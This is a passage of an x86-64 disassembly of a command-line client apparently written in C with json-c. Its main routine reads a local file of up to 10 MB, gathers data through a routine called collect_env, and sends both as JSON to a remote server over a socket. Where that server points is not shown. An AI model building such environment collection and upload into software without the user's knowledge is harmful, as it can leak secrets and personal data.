    13b4:	f2 ff 25 e5 2b 00 00 	bnd jmp QWORD PTR [rip+0x2be5]        # 3fa0 <exit@GLIBC_2.2.5>
    13bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013c0 <connect@plt>:
    13c0:	f3 0f 1e fa          	endbr64
    13c4:	f2 ff 25 dd 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bdd]        # 3fa8 <connect@GLIBC_2.2.5>
    13cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013d0 <fwrite@plt>:
    13d0:	f3 0f 1e fa          	endbr64
    13d4:	f2 ff 25 d5 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bd5]        # 3fb0 <fwrite@GLIBC_2.2.5>
    13db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013e0 <__fprintf_chk@plt>:
    13e0:	f3 0f 1e fa          	endbr64
    13e4:	f2 ff 25 cd 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bcd]        # 3fb8 <__fprintf_chk@GLIBC_2.3.4>
    13eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013f0 <json_object_new_object@plt>:
    13f0:	f3 0f 1e fa          	endbr64
    13f4:	f2 ff 25 c5 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bc5]        # 3fc0 <json_object_new_object@JSONC_0.14>
    13fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001400 <json_object_new_int@plt>:
    1400:	f3 0f 1e fa          	endbr64
    1404:	f2 ff 25 bd 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bbd]        # 3fc8 <json_object_new_int@JSONC_0.14>
    140b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001410 <socket@plt>:
    1410:	f3 0f 1e fa          	endbr64
    1414:	f2 ff 25 b5 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bb5]        # 3fd0 <socket@GLIBC_2.2.5>
    141b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

0000000000001420 <main>:
    1420:	f3 0f 1e fa          	endbr64
    1424:	41 57                	push   r15
    1426:	41 56                	push   r14
    1428:	41 55                	push   r13
    142a:	41 54                	push   r12
    142c:	55                   	push   rbp
    142d:	53                   	push   rbx
    142e:	48 89 f3             	mov    rbx,rsi
    1431:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
    1438:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    143f:	00 00 
    1441:	48 89 84 24 a8 00 00 	mov    QWORD PTR [rsp+0xa8],rax
    1448:	00 
    1449:	31 c0                	xor    eax,eax
    144b:	83 ff 01             	cmp    edi,0x1
    144e:	0f 8e e8 02 00 00    	jle    173c <main+0x31c>
    1454:	4c 8b 6e 08          	mov    r13,QWORD PTR [rsi+0x8]
    1458:	4c 8d 35 f1 0b 00 00 	lea    r14,[rip+0xbf1]        # 2050 <_IO_stdin_used+0x50>
    145f:	89 fd                	mov    ebp,edi
    1461:	4c 89 f6             	mov    rsi,r14
    1464:	4c 89 ef             	mov    rdi,r13
    1467:	e8 c4 fe ff ff       	call   1330 <strcmp@plt>
    146c:	41 89 c4             	mov    r12d,eax
    146f:	85 c0                	test   eax,eax
    1471:	0f 85 cb 01 00 00    	jne    1642 <main+0x222>
    1477:	83 fd 02             	cmp    ebp,0x2
    147a:	0f 84 f1 03 00 00    	je     1871 <main+0x451>
    1480:	48 8b 5b 10          	mov    rbx,QWORD PTR [rbx+0x10]
    1484:	48 8d 74 24 10       	lea    rsi,[rsp+0x10]
    1489:	48 89 df             	mov    rdi,rbx
    148c:	e8 bf fe ff ff       	call   1350 <stat@plt>
    1491:	85 c0                	test   eax,eax
    1493:	0f 88 66 04 00 00    	js     18ff <main+0x4df>
    1499:	8b 44 24 28          	mov    eax,DWORD PTR [rsp+0x28]
    149d:	25 00 f0 00 00       	and    eax,0xf000
    14a2:	3d 00 80 00 00       	cmp    eax,0x8000
    14a7:	0f 85 0e 04 00 00    	jne    18bb <main+0x49b>
    14ad:	48 81 7c 24 40 00 00 	cmp    QWORD PTR [rsp+0x40],0xa00000
    14b4:	a0 00 
    14b6:	0f 8f 21 04 00 00    	jg     18dd <main+0x4bd>
    14bc:	48 8d 35 c1 0b 00 00 	lea    rsi,[rip+0xbc1]        # 2084 <_IO_stdin_used+0x84>
    14c3:	48 89 df             	mov    rdi,rbx
    14c6:	e8 c5 fe ff ff       	call   1390 <fopen@plt>
    14cb:	48 89 c5             	mov    rbp,rax
    14ce:	48 85 c0             	test   rax,rax
    14d1:	0f 84 53 04 00 00    	je     192a <main+0x50a>
    14d7:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
    14dc:	41 89 c5             	mov    r13d,eax
    14df:	48 89 04 24          	mov    QWORD PTR [rsp],rax
    14e3:	4c 89 ef             	mov    rdi,r13
    14e6:	89 44 24 0c          	mov    DWORD PTR [rsp+0xc],eax
    14ea:	e8 71 fe ff ff       	call   1360 <malloc@plt>
    14ef:	49 89 c7             	mov    r15,rax
    14f2:	48 85 c0             	test   rax,rax
    14f5:	0f 84 40 04 00 00    	je     193b <main+0x51b>
    14fb:	48 89 c7             	mov    rdi,rax
    14fe:	48 89 e9             	mov    rcx,rbp
    1501:	4c 89 ea             	mov    rdx,r13
    1504:	be 01 00 00 00       	mov    esi,0x1
    1509:	e8 72 fd ff ff       	call   1280 <fread@plt>
    150e:	48 89 ef             	mov    rdi,rbp
    1511:	49 39 c5             	cmp    r13,rax
    1514:	0f 85 4a 02 00 00    	jne    1764 <main+0x344>
    151a:	e8 91 fd ff ff       	call   12b0 <fclose@plt>
    151f:	e8 3c 09 00 00       	call   1e60 <connect_sock>
    1524:	41 89 c5             	mov    r13d,eax
    1527:	85 c0                	test   eax,eax
    1529:	0f 88 e6 03 00 00    	js     1915 <main+0x4f5>
    152f:	e8 bc fe ff ff       	call   13f0 <json_object_new_object@plt>
    1534:	4c 89 f7             	mov    rdi,r14
    1537:	48 89 c5             	mov    rbp,rax
    153a:	e8 f1 fc ff ff       	call   1230 <json_object_new_string@plt>
    153f:	48 8d 35 88 0b 00 00 	lea    rsi,[rip+0xb88]        # 20ce <_IO_stdin_used+0xce>
    1546:	48 89 ef             	mov    rdi,rbp
    1549:	48 89 c2             	mov    rdx,rax
    154c:	e8 9f fd ff ff       	call   12f0 <json_object_object_add@plt>
    1551:	48 89 df             	mov    rdi,rbx
    1554:	e8 d7 fc ff ff       	call   1230 <json_object_new_string@plt>
    1559:	48 8d 35 71 0b 00 00 	lea    rsi,[rip+0xb71]        # 20d1 <_IO_stdin_used+0xd1>
    1560:	48 89 ef             	mov    rdi,rbp
    1563:	48 89 c2             	mov    rdx,rax
    1566:	e8 85 fd ff ff       	call   12f0 <json_object_object_add@plt>
    156b:	48 8d 3d b7 0a 00 00 	lea    rdi,[rip+0xab7]        # 2029 <_IO_stdin_used+0x29>
    1572:	e8 b9 fc ff ff       	call   1230 <json_object_new_string@plt>
    1577:	48 8d 35 5c 0b 00 00 	lea    rsi,[rip+0xb5c]        # 20da <_IO_stdin_used+0xda>
    157e:	48 89 ef             	mov    rdi,rbp
    1581:	48 89 c2             	mov    rdx,rax
    1584:	e8 67 fd ff ff       	call   12f0 <json_object_object_add@plt>
    1589:	8b 3c 24             	mov    edi,DWORD PTR [rsp]
    158c:	e8 6f fe ff ff       	call   1400 <json_object_new_int@plt>
    1591:	48 89 ef             	mov    rdi,rbp
    1594:	48 8d 35 45 0b 00 00 	lea    rsi,[rip+0xb45]        # 20e0 <_IO_stdin_used+0xe0>
    159b:	48 89 c2             	mov    rdx,rax
    159e:	e8 4d fd ff ff       	call   12f0 <json_object_object_add@plt>
    15a3:	e8 98 05 00 00       	call   1b40 <collect_env>
    15a8:	48 89 ef             	mov    rdi,rbp
    15ab:	48 8d 35 3d 0b 00 00 	lea    rsi,[rip+0xb3d]        # 20ef <_IO_stdin_used+0xef>
    15b2:	48 89 c2             	mov    rdx,rax
    15b5:	e8 36 fd ff ff       	call   12f0 <json_object_object_add@plt>
    15ba:	8b 4c 24 0c          	mov    ecx,DWORD PTR [rsp+0xc]
    15be:	48 89 ee             	mov    rsi,rbp
    15c1:	4c 89 fa             	mov    rdx,r15
    15c4:	44 89 ef             	mov    edi,r13d
    15c7:	e8 a4 06 00 00       	call   1c70 <send_header_and_content>
    15cc:	48 89 ef             	mov    rdi,rbp
    15cf:	e8 9c fd ff ff       	call   1370 <json_object_put@plt>
    15d4:	4c 89 ff             	mov    rdi,r15
    15d7:	e8 64 fc ff ff       	call   1240 <free@plt>
    15dc:	44 89 ef             	mov    edi,r13d
    15df:	e8 bc 07 00 00       	call   1da0 <recv_response>
    15e4:	48 89 c5             	mov    rbp,rax
    15e7:	48 85 c0             	test   rax,rax
    15ea:	0f 84 5f 02 00 00    	je     184f <main+0x42f>
    15f0:	48 89 c2             	mov    rdx,rax
    15f3:	bf 01 00 00 00       	mov    edi,0x1
    15f8:	48 8d 35 f4 0a 00 00 	lea    rsi,[rip+0xaf4]        # 20f3 <_IO_stdin_used+0xf3>
    15ff:	31 c0                	xor    eax,eax
    1601:	e8 7a fd ff ff       	call   1380 <__printf_chk@plt>
    1606:	48 89 ef             	mov    rdi,rbp
    1609:	e8 32 fc ff ff       	call   1240 <free@plt>
    160e:	44 89 ef             	mov    edi,r13d
    1611:	e8 ea fc ff ff       	call   1300 <close@plt>
    1616:	48 8b 84 24 a8 00 00 	mov    rax,QWORD PTR [rsp+0xa8]
    161d:	00 
    161e:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28
    1625:	00 00 
    1627:	0f 85 e3 02 00 00    	jne    1910 <main+0x4f0>
    162d:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
    1634:	44 89 e0             	mov    eax,r12d
    1637:	5b                   	pop    rbx
    1638:	5d                   	pop    rbp
    1639:	41 5c                	pop    r12
    163b:	41 5d                	pop    r13
    163d:	41 5e                	pop    r14
    163f:	41 5f                	pop    r15
    1641:	c3                   	ret
    1642:	4c 8d 35 b7 0a 00 00 	lea    r14,[rip+0xab7]        # 2100 <_IO_stdin_used+0x100>
    1649:	4c 89 ef             	mov    rdi,r13
    164c:	4c 89 f6             	mov    rsi,r14
    164f:	e8 dc fc ff ff       	call   1330 <strcmp@plt>
    1654:	41 89 c4             	mov    r12d,eax
    1657:	85 c0                	test   eax,eax
    1659:	0f 84 23 01 00 00    	je     1782 <main+0x362>
    165f:	4c 8d 35 b6 0a 00 00 	lea    r14,[rip+0xab6]        # 211c <_IO_stdin_used+0x11c>
    1666:	4c 89 ef             	mov    rdi,r13
    1669:	4c 89 f6             	mov    rsi,r14
    166c:	e8 bf fc ff ff       	call   1330 <strcmp@plt>
    1671:	41 89 c4             	mov    r12d,eax
    1674:	85 c0                	test   eax,eax
    1676:	0f 85 c0 00 00 00    	jne    173c <main+0x31c>
    167c:	e8 df 07 00 00       	call   1e60 <connect_sock>
    1681:	41 89 c5             	mov    r13d,eax
    1684:	85 c0                	test   eax,eax
    1686:	0f 88 89 02 00 00    	js     1915 <main+0x4f5>
    168c:	e8 5f fd ff ff       	call   13f0 <json_object_new_object@plt>
    1691:	4c 89 f7             	mov    rdi,r14
    1694:	48 89 c5             	mov    rbp,rax
    1697:	e8 94 fb ff ff       	call   1230 <json_object_new_string@plt>
    169c:	48 8d 35 2b 0a 00 00 	lea    rsi,[rip+0xa2b]        # 20ce <_IO_stdin_used+0xce>
    16a3:	48 89 ef             	mov    rdi,rbp
    16a6:	48 89 c2             	mov    rdx,rax
    16a9:	e8 42 fc ff ff       	call   12f0 <json_object_object_add@plt>
    16ae:	48 8d 3d 74 09 00 00 	lea    rdi,[rip+0x974]        # 2029 <_IO_stdin_used+0x29>
    16b5:	e8 76 fb ff ff       	call   1230 <json_object_new_string@plt>
    16ba:	48 8d 35 19 0a 00 00 	lea    rsi,[rip+0xa19]        # 20da <_IO_stdin_used+0xda>
    16c1:	48 89 ef             	mov    rdi,rbp
    16c4:	48 89 c2             	mov    rdx,rax
    16c7:	e8 24 fc ff ff       	call   12f0 <json_object_object_add@plt>
    16cc:	31 ff                	xor    edi,edi
    16ce:	e8 2d fd ff ff       	call   1400 <json_object_new_int@plt>
    16d3:	48 89 ef             	mov    rdi,rbp
    16d6:	48 8d 35 03 0a 00 00 	lea    rsi,[rip+0xa03]        # 20e0 <_IO_stdin_used+0xe0>
    16dd:	48 89 c2             	mov    rdx,rax
    16e0:	e8 0b fc ff ff       	call   12f0 <json_object_object_add@plt>
    16e5:	e8 56 04 00 00       	call   1b40 <collect_env>
    16ea:	48 89 ef             	mov    rdi,rbp
    16ed:	48 8d 35 fb 09 00 00 	lea    rsi,[rip+0x9fb]        # 20ef <_IO_stdin_used+0xef>
    16f4:	48 89 c2             	mov    rdx,rax
    16f7:	e8 f4 fb ff ff       	call   12f0 <json_object_object_add@plt>
    16fc:	48 89 ee             	mov    rsi,rbp
    16ff:	31 c9                	xor    ecx,ecx
    1701:	31 d2                	xor    edx,edx
    1703:	44 89 ef             	mov    edi,r13d
    1706:	e8 65 05 00 00       	call   1c70 <send_header_and_content>
    170b:	48 89 ef             	mov    rdi,rbp
    170e:	e8 5d fc ff ff       	call   1370 <json_object_put@plt>
    1713:	44 89 ef             	mov    edi,r13d
    1716:	e8 85 06 00 00       	call   1da0 <recv_response>
    171b:	48 89 c5             	mov    rbp,rax
    171e:	48 85 c0             	test   rax,rax
    1721:	0f 84 72 01 00 00    	je     1899 <main+0x479>
    1727:	48 89 ef             	mov    rdi,rbp
    172a:	e8 41 fb ff ff       	call   1270 <puts@plt>
    172f:	48 89 ef             	mov    rdi,rbp
    1732:	e8 09 fb ff ff       	call   1240 <free@plt>
    1737:	e9 d2 fe ff ff       	jmp    160e <main+0x1ee>
    173c:	48 8b 0b             	mov    rcx,QWORD PTR [rbx]
    173f:	be 01 00 00 00       	mov    esi,0x1
    1744:	31 c0                	xor    eax,eax
    1746:	41 bc 01 00 00 00    	mov    r12d,0x1
    174c:	48 8b 3d ed 28 00 00 	mov    rdi,QWORD PTR [rip+0x28ed]        # 4040 <stderr@GLIBC_2.2.5>
    1753:	48 8d 15 ce 09 00 00 	lea    rdx,[rip+0x9ce]        # 2128 <_IO_stdin_used+0x128>
    175a:	e8 81 fc ff ff       	call   13e0 <__fprintf_chk@plt>
    175f:	e9 b2 fe ff ff       	jmp    1616 <main+0x1f6>
    1764:	e8 47 fb ff ff       	call   12b0 <fclose@plt>
    1769:	4c 89 ff             	mov    rdi,r15
    176c:	e8 cf fa ff ff       	call   1240 <free@plt>
    1771:	48 89 de             	mov    rsi,rbx
    1774:	48 8d 3d 12 09 00 00 	lea    rdi,[rip+0x912]        # 208d <_IO_stdin_used+0x8d>
    177b:	31 c0                	xor    eax,eax
    177d:	e8 be 02 00 00       	call   1a40 <die>
    1782:	e8 d9 06 00 00       	call   1e60 <connect_sock>
    1787:	41 89 c5             	mov    r13d,eax
    178a:	85 c0                	test   eax,eax
    178c:	0f 88 83 01 00 00    	js     1915 <main+0x4f5>
    1792:	e8 59 fc ff ff       	call   13f0 <json_object_new_object@plt>
    1797:	4c 89 f7             	mov    rdi,r14
    179a:	48 89 c5             	mov    rbp,rax
    179d:	e8 8e fa ff ff       	call   1230 <json_object_new_string@plt>
    17a2:	48 8d 35 25 09 00 00 	lea    rsi,[rip+0x925]        # 20ce <_IO_stdin_used+0xce>
    17a9:	48 89 ef             	mov    rdi,rbp
    17ac:	48 89 c2             	mov    rdx,rax
    17af:	e8 3c fb ff ff       	call   12f0 <json_object_object_add@plt>
    17b4:	48 8d 3d 6e 08 00 00 	lea    rdi,[rip+0x86e]        # 2029 <_IO_stdin_used+0x29>
    17bb:	e8 70 fa ff ff       	call   1230 <json_object_new_string@plt>
    17c0:	48 8d 35 13 09 00 00 	lea    rsi,[rip+0x913]        # 20da <_IO_stdin_used+0xda>
    17c7:	48 89 ef             	mov    rdi,rbp
    17ca:	48 89 c2             	mov    rdx,rax
    17cd:	e8 1e fb ff ff       	call   12f0 <json_object_object_add@plt>
    17d2:	31 ff                	xor    edi,edi
    17d4:	e8 27 fc ff ff       	call   1400 <json_object_new_int@plt>
    17d9:	48 89 ef             	mov    rdi,rbp
    17dc:	48 8d 35 fd 08 00 00 	lea    rsi,[rip+0x8fd]        # 20e0 <_IO_stdin_used+0xe0>
    17e3:	48 89 c2             	mov    rdx,rax
    17e6:	e8 05 fb ff ff       	call   12f0 <json_object_object_add@plt>
    17eb:	e8 50 03 00 00       	call   1b40 <collect_env>
    17f0:	48 89 ef             	mov    rdi,rbp
    17f3:	48 8d 35 f5 08 00 00 	lea    rsi,[rip+0x8f5]        # 20ef <_IO_stdin_used+0xef>
    17fa:	48 89 c2             	mov    rdx,rax
    17fd:	e8 ee fa ff ff       	call   12f0 <json_object_object_add@plt>
    1802:	48 89 ee             	mov    rsi,rbp
    1805:	31 c9                	xor    ecx,ecx
    1807:	31 d2                	xor    edx,edx
    1809:	44 89 ef             	mov    edi,r13d
    180c:	e8 5f 04 00 00       	call   1c70 <send_header_and_content>
    1811:	48 89 ef             	mov    rdi,rbp
    1814:	e8 57 fb ff ff       	call   1370 <json_object_put@plt>
    1819:	44 89 ef             	mov    edi,r13d
    181c:	e8 7f 05 00 00       	call   1da0 <recv_response>
    1821:	48 89 c5             	mov    rbp,rax
    1824:	48 85 c0             	test   rax,rax
    1827:	0f 85 fa fe ff ff    	jne    1727 <main+0x307>
    182d:	48 8b 0d 0c 28 00 00 	mov    rcx,QWORD PTR [rip+0x280c]        # 4040 <stderr@GLIBC_2.2.5>
    1834:	ba 15 00 00 00       	mov    edx,0x15
    1839:	be 01 00 00 00       	mov    esi,0x1
    183e:	48 8d 3d c1 08 00 00 	lea    rdi,[rip+0x8c1]        # 2106 <_IO_stdin_used+0x106>
    1845:	e8 86 fb ff ff       	call   13d0 <fwrite@plt>
    184a:	e9 bf fd ff ff       	jmp    160e <main+0x1ee>
    184f:	48 8b 0d ea 27 00 00 	mov    rcx,QWORD PTR [rip+0x27ea]        # 4040 <stderr@GLIBC_2.2.5>
    1856:	ba 21 00 00 00       	mov    edx,0x21
    185b:	be 01 00 00 00       	mov    esi,0x1
    1860:	48 8d 3d a9 09 00 00 	lea    rdi,[rip+0x9a9]        # 2210 <_IO_stdin_used+0x210>
    1867:	e8 64 fb ff ff       	call   13d0 <fwrite@plt>
    186c:	e9 9d fd ff ff       	jmp    160e <main+0x1ee>
    1871:	ba 27 00 00 00       	mov    edx,0x27
    1876:	48 8b 0d c3 27 00 00 	mov    rcx,QWORD PTR [rip+0x27c3]        # 4040 <stderr@GLIBC_2.2.5>
    187d:	be 01 00 00 00       	mov    esi,0x1
    1882:	48 8d 3d 5f 09 00 00 	lea    rdi,[rip+0x95f]        # 21e8 <_IO_stdin_used+0x1e8>
    1889:	41 bc 01 00 00 00    	mov    r12d,0x1
    188f:	e8 3c fb ff ff       	call   13d0 <fwrite@plt>
    1894:	e9 7d fd ff ff       	jmp    1616 <main+0x1f6>
    1899:	48 8b 0d a0 27 00 00 	mov    rcx,QWORD PTR [rip+0x27a0]        # 4040 <stderr@GLIBC_2.2.5>
    18a0:	ba 21 00 00 00       	mov    edx,0x21
    18a5:	be 01 00 00 00       	mov    esi,0x1
    18aa:	48 8d 3d 87 09 00 00 	lea    rdi,[rip+0x987]        # 2238 <_IO_stdin_used+0x238>
    18b1:	e8 1a fb ff ff       	call   13d0 <fwrite@plt>
    18b6:	e9 53 fd ff ff       	jmp    160e <main+0x1ee>
    18bb:	48 8b 3d 7e 27 00 00 	mov    rdi,QWORD PTR [rip+0x277e]        # 4040 <stderr@GLIBC_2.2.5>
    18c2:	48 89 d9             	mov    rcx,rbx
    18c5:	be 01 00 00 00       	mov    esi,0x1
    18ca:	31 c0                	xor    eax,eax
    18cc:	48 8d 15 89 07 00 00 	lea    rdx,[rip+0x789]        # 205c <_IO_stdin_used+0x5c>
    18d3:	e8 08 fb ff ff       	call   13e0 <__fprintf_chk@plt>
    18d8:	e9 94 fe ff ff       	jmp    1771 <main+0x351>
    18dd:	48 8b 0d 5c 27 00 00 	mov    rcx,QWORD PTR [rip+0x275c]        # 4040 <stderr@GLIBC_2.2.5>
    18e4:	ba 0f 00 00 00       	mov    edx,0xf
    18e9:	be 01 00 00 00       	mov    esi,0x1
    18ee:	48 8d 3d 7f 07 00 00 	lea    rdi,[rip+0x77f]        # 2074 <_IO_stdin_used+0x74>
    18f5:	e8 d6 fa ff ff       	call   13d0 <fwrite@plt>
    18fa:	e9 72 fe ff ff       	jmp    1771 <main+0x351>
    18ff:	48 8d 3d 51 07 00 00 	lea    rdi,[rip+0x751]        # 2057 <_IO_stdin_used+0x57>
    1906:	e8 95 fa ff ff       	call   13a0 <perror@plt>
    190b:	e9 61 fe ff ff       	jmp    1771 <main+0x351>
    1910:	e8 bb f9 ff ff       	call   12d0 <__stack_chk_fail@plt>
    1915:	48 8d 35 84 07 00 00 	lea    rsi,[rip+0x784]        # 20a0 <_IO_stdin_used+0xa0>
    191c:	48 8d 3d 92 07 00 00 	lea    rdi,[rip+0x792]        # 20b5 <_IO_stdin_used+0xb5>
    1923:	31 c0                	xor    eax,eax
    1925:	e8 16 01 00 00       	call   1a40 <die>
    192a:	48 8d 3d 56 07 00 00 	lea    rdi,[rip+0x756]        # 2087 <_IO_stdin_used+0x87>
    1931:	e8 6a fa ff ff       	call   13a0 <perror@plt>
    1936:	e9 36 fe ff ff       	jmp    1771 <main+0x351>
    193b:	48 89 ef             	mov    rdi,rbp
    193e:	e8 6d f9 ff ff       	call   12b0 <fclose@plt>
    1943:	e9 29 fe ff ff       	jmp    1771 <main+0x351>
    1948:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
    194f:	00 

0000000000001950 <_start>:
    1950:	f3 0f 1e fa          	endbr64
    1954:	31 ed                	xor    ebp,ebp
    1956:	49 89 d1             	mov    r9,rdx
    1959:	5e                   	pop    rsi
    195a:	48 89 e2             	mov    rdx,rsp
    195d:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
    1961:	50                   	push   rax
    1962:	54                   	push   rsp
    1963:	45 31 c0             	xor    r8d,r8d
    1966:	31 c9                	xor    ecx,ecx
    1968:	48 8d 3d b1 fa ff ff 	lea    rdi,[rip+0xfffffffffffffab1]        # 1420 <main>
    196f:	ff 15 63 26 00 00    	call   QWORD PTR [rip+0x2663]        # 3fd8 <__libc_start_main@GLIBC_2.34>
    1975:	f4                   	hlt
    1976:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
    197d:	00 00 00 

0000000000001980 <deregister_tm_clones>:
    1980:	48 8d 3d 89 26 00 00 	lea    rdi,[rip+0x2689]        # 4010 <__TMC_END__>
    1987:	48 8d 05 82 26 00 00 	lea    rax,[rip+0x2682]        # 4010 <__TMC_END__>
    198e:	48 39 f8             	cmp    rax,rdi
    1991:	74 15                	je     19a8 <deregister_tm_clones+0x28>
    1993:	48 8b 05 46 26 00 00 	mov    rax,QWORD PTR [rip+0x2646]        # 3fe0 <_ITM_deregisterTMCloneTable@Base>
    199a:	48 85 c0             	test   rax,rax
    199d:	74 09                	je     19a8 <deregister_tm_clones+0x28>
    199f:	ff e0                	jmp    rax
    19a1:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    19a8:	c3                   	ret
    19a9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

00000000000019b0 <register_tm_clones>:
    19b0:	48 8d 3d 59 26 00 00 	lea    rdi,[rip+0x2659]        # 4010 <__TMC_END__>
    19b7:	48 8d 35 52 26 00 00 	lea    rsi,[rip+0x2652]        # 4010 <__TMC_END__>
    19be:	48 29 fe             	sub    rsi,rdi
    19c1:	48 89 f0             	mov    rax,rsi
    19c4:	48 c1 ee 3f          	shr    rsi,0x3f
    19c8:	48 c1 f8 03          	sar    rax,0x3
    19cc:	48 01 c6             	add    rsi,rax
    19cf:	48 d1 fe             	sar    rsi,1
    19d2:	74 14                	je     19e8 <register_tm_clones+0x38>
    19d4:	48 8b 05 15 26 00 00 	mov    rax,QWORD PTR [rip+0x2615]        # 3ff0 <_ITM_registerTMCloneTable@Base>
    19db:	48 85 c0             	test   rax,rax
    19de:	74 08                	je     19e8 <register_tm_clones+0x38>
    19e0:	ff e0                	jmp    rax
    19e2:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
    19e8:	c3                   	ret
    19e9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

00000000000019f0 <__do_global_dtors_aux>:
    19f0:	f3 0f 1e fa          	endbr64
    19f4:	80 3d 4d 26 00 00 00 	cmp    BYTE PTR [rip+0x264d],0x0        # 4048 <completed.0>
    19fb:	75 2b                	jne    1a28 <__do_global_dtors_aux+0x38>
    19fd:	55                   	push   rbp
    19fe:	48 83 3d f2 25 00 00 	cmp    QWORD PTR [rip+0x25f2],0x0        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1a05:	00 
    1a06:	48 89 e5             	mov    rbp,rsp
    1a09:	74 0c                	je     1a17 <__do_global_dtors_aux+0x27>
    1a0b:	48 8b 3d f6 25 00 00 	mov    rdi,QWORD PTR [rip+0x25f6]        # 4008 <__dso_handle>
    1a12:	e8 09 f8 ff ff       	call   1220 <__cxa_finalize@plt>
    1a17:	e8 64 ff ff ff       	call   1980 <deregister_tm_clones>
    1a1c:	c6 05 25 26 00 00 01 	mov    BYTE PTR [rip+0x2625],0x1        # 4048 <completed.0>
    1a23:	5d                   	pop    rbp
    1a24:	c3                   	ret
    1a25:	0f 1f 00             	nop    DWORD PTR [rax]
    1a28:	c3                   	ret
    1a29:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001a30 <frame_dummy>:
    1a30:	f3 0f 1e fa          	endbr64
    1a34:	e9 77 ff ff ff       	jmp    19b0 <register_tm_clones>
    1a39:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001a40 <die>:
    1a40:	41 54                	push   r12
    1a42:	49 89 fc             	mov    r12,rdi
    1a45:	48 81 ec d0 00 00 00 	sub    rsp,0xd0
    1a4c:	48 89 74 24 28       	mov    QWORD PTR [rsp+0x28],rsi
    1a51:	48 89 54 24 30       	mov    QWORD PTR [rsp+0x30],rdx
    1a56:	48 89 4c 24 38       	mov    QWORD PTR [rsp+0x38],rcx
    1a5b:	4c 89 44 24 40       	mov    QWORD PTR [rsp+0x40],r8
    1a60:	4c 89 4c 24 48       	mov    QWORD PTR [rsp+0x48],r9
    1a65:	84 c0                	test   al,al
    1a67:	74 37                	je     1aa0 <die+0x60>
    1a69:	0f 29 44 24 50       	movaps XMMWORD PTR [rsp+0x50],xmm0
    1a6e:	0f 29 4c 24 60       	movaps XMMWORD PTR [rsp+0x60],xmm1
    1a73:	0f 29 54 24 70       	movaps XMMWORD PTR [rsp+0x70],xmm2
    1a78:	0f 29 9c 24 80 00 00 	movaps XMMWORD PTR [rsp+0x80],xmm3
    1a7f:	00 
    1a80:	0f 29 a4 24 90 00 00 	movaps XMMWORD PTR [rsp+0x90],xmm4
    1a87:	00 
    1a88:	0f 29 ac 24 a0 00 00 	movaps XMMWORD PTR [rsp+0xa0],xmm5
    1a8f:	00 
    1a90:	0f 29 b4 24 b0 00 00 	movaps XMMWORD PTR [rsp+0xb0],xmm6
    1a97:	00 
    1a98:	0f 29 bc 24 c0 00 00 	movaps XMMWORD PTR [rsp+0xc0],xmm7
    1a9f:	00 
    1aa0:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1aa7:	00 00 
    1aa9:	48 89 44 24 18       	mov    QWORD PTR [rsp+0x18],rax
    1aae:	31 c0                	xor    eax,eax
    1ab0:	ba 0c 00 00 00       	mov    edx,0xc
    1ab5:	be 01 00 00 00       	mov    esi,0x1
    1aba:	48 8b 0d 7f 25 00 00 	mov    rcx,QWORD PTR [rip+0x257f]        # 4040 <stderr@GLIBC_2.2.5>
    1ac1:	48 8d 84 24 e0 00 00 	lea    rax,[rsp+0xe0]
    1ac8:	00 
    1ac9:	48 8d 3d 34 05 00 00 	lea    rdi,[rip+0x534]        # 2004 <_IO_stdin_used+0x4>
    1ad0:	c7 04 24 08 00 00 00 	mov    DWORD PTR [rsp],0x8
    1ad7:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
    1adc:	48 8d 44 24 20       	lea    rax,[rsp+0x20]
    1ae1:	c7 44 24 04 30 00 00 	mov    DWORD PTR [rsp+0x4],0x30
    1ae8:	00 
    1ae9:	48 89 44 24 10       	mov    QWORD PTR [rsp+0x10],rax
    1aee:	e8 dd f8 ff ff       	call   13d0 <fwrite@plt>
    1af3:	48 89 e1             	mov    rcx,rsp
    1af6:	4c 89 e2             	mov    rdx,r12
    1af9:	be 01 00 00 00       	mov    esi,0x1
    1afe:	48 8b 3d 3b 25 00 00 	mov    rdi,QWORD PTR [rip+0x253b]        # 4040 <stderr@GLIBC_2.2.5>
    1b05:	e8 46 f7 ff ff       	call   1250 <__vfprintf_chk@plt>
    1b0a:	ba 04 00 00 00       	mov    edx,0x4
    1b0f:	be 01 00 00 00       	mov    esi,0x1
    1b14:	48 8b 0d 25 25 00 00 	mov    rcx,QWORD PTR [rip+0x2525]        # 4040 <stderr@GLIBC_2.2.5>
    1b1b:	48 8d 3d ef 04 00 00 	lea    rdi,[rip+0x4ef]        # 2011 <_IO_stdin_used+0x11>
    1b22:	e8 a9 f8 ff ff       	call   13d0 <fwrite@plt>
